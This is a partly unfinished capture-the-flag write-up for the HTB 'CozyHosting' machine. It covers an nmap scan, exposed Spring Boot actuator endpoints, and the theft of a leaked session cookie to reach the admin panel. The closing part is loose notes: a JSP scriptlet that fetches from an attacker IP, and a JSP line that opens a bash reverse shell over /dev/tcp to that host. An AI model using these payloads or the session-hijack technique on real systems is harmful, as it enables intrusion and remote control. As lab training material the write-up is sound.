# Introduction

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx cozyhosting.htb
```

# Enumeration

we do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -p- -sV cozyhosting.htb
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# HTTP (port 80)
after investicating, it seems it is Spring Boot running (JSP Java Server Pages)
we found some url in actuator
```
200      GET        1l        1w       15c http://cozyhosting.htb/actuator/health
200      GET        1l        1w      495c http://cozyhosting.htb/actuator/sessions
200      GET        1l      120w     4957c http://cozyhosting.htb/actuator/env
200      GET        1l      542w   127224c http://cozyhosting.htb/actuator/beans
```

the url http://cozyhosting.htb/actuator/sessions is interesting because we have kaderson that have a open session with his JSESSIONID exposed
we stole the id session and can access the admin back office

htb.cloudhosting.CozyHostingApp$$SpringCGLIB$$0


usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]%20%20%20%20%20%20%20%20%20%20 [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]%20%20%20%20%20%20%20%20%20%20 [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]%20%20%20%20%20%20%20%20%20%20 [-i identity_file] [-J [user@]host[:port]] [-L address]%20%20%20%20%20%20%20%20%20%20 [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]%20%20%20%20%20%20%20%20%20%20 [-Q query_option] [-R address] [-S ctl_path] [-W host:port]%20%20%20%20%20%20%20%20%20%20 [-w local_tun[:remote_tun]] destination [command [argument ...]]




<% URL obj = new URL("http://10.10.14.136:8000/test.jpg");	HttpURLConnection con = (HttpURLConnection) obj.openConnection();	con.setRequestMethod("GET"); int responseCode = con.getResponseCode(); %>


<% Runtime r = Runtime.getRuntime(); Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.10.14.136/6666;cat <&5 | while read line; do $line 2>&5 >&5; done'"); p.waitFor();
